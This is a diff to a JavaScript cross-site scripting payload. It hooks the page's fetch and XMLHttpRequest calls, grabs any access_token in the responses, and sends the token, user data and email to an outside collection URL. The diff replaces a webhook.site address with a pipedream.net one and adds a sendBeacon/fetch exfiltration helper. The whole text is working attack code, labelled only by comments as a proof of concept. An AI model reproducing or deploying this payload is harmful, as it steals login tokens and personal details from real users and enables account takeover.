@@ -1,5 +1,28 @@
 (function() {
-    // Hook fetch()
+    // ===== CONFIGURATION =====
+    var EXFIL_URL = 'https://6b884da34ac52d711d2d20ef6f2bf068.m.pipedream.net';
+    // =========================
+
+    function exfiltrate(data) {
+        // Try sendBeacon first; fallback to fetch with keepalive
+        try {
+            navigator.sendBeacon(EXFIL_URL, JSON.stringify(data));
+        } catch (e) {
+            fetch(EXFIL_URL, {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: { 'Content-Type': 'application/json' },
+                keepalive: true
+            }).catch(function(err) {
+                // If both fail, at least log to console for PoC
+                console.error('[XSS] Exfil failed:', err);
+            });
+        }
+        // Always log to console for proof (visible in dev tools)
+        console.log('[XSS] Token stolen:', data.token);
+    }
+
+    // --- Hook fetch() ---
     var originalFetch = window.fetch;
     window.fetch = function() {
         var args = arguments;
@@ -7,23 +30,20 @@
             var clone = response.clone();
             clone.json().then(function(data) {
                 if (data && data.access_token) {
-                    navigator.sendBeacon(
-                        'https://webhook.site/11f969c8-5b06-4d0a-a7c8-d80bb7a2f322',
-                        JSON.stringify({
-                            token: data.access_token,
-                            user: data.user,
-                            email: data.user ? data.user.email : null,
-                            timestamp: new Date().toISOString()
-                        })
-                    );
-                    console.log('[XSS] Token stolen:', data.access_token);
+                    exfiltrate({
+                        token: data.access_token,
+                        user: data.user,
+                        email: data.user ? data.user.email : null,
+                        timestamp: new Date().toISOString(),
+                        source: 'fetch'
+                    });
                 }
             }).catch(function() {});
             return response;
         });
     };
 
-    // Hook XMLHttpRequest
+    // --- Hook XMLHttpRequest ---
     var originalOpen = XMLHttpRequest.prototype.open;
     var originalSend = XMLHttpRequest.prototype.send;
 
@@ -39,16 +59,13 @@
                 try {
                     var data = JSON.parse(self.responseText);
                     if (data && data.access_token) {
-                        navigator.sendBeacon(
-                            'https://webhook.site/11f969c8-5b06-4d0a-a7c8-d80bb7a2f322',
-                            JSON.stringify({
-                                token: data.access_token,
-                                user: data.user,
-                                email: data.user ? data.user.email : null,
-                                timestamp: new Date().toISOString()
-                            })
-                        );
-                        console.log('[XSS] Token stolen via XHR:', data.access_token);
+                        exfiltrate({
+                            token: data.access_token,
+                            user: data.user,
+                            email: data.user ? data.user.email : null,
+                            timestamp: new Date().toISOString(),
+                            source: 'xhr'
+                        });
                     }
                 } catch(e) {}
             }
@@ -56,5 +73,5 @@
         return originalSend.apply(this, arguments);
     };
 
-    console.log('[XSS] Payload loaded from GitHub Pages – token interceptor installed.');
+    console.log('[XSS] Payload loaded – token interceptor installed.');
 })();
